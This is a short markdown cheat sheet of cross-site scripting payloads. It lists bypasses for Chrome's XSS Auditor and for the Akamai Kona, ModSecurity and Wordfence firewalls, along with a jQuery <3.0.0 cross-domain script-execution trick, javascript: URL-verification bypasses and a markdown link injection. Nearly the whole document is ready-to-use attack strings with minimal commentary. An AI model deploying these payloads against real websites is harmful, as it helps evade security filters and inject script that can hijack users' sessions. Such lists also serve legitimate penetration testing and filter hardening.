## XSS

**Chrome XSS-Auditor Bypass** by [Masato Kinugawa](https://github.com/masatokinugawa)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```
**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
2) Find any requests to trusted API endpoints where script can be injected into data sources.

**URL verification bypasses (works without `&#x09;` too)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript://www.google.com%0Aprompt(1))
```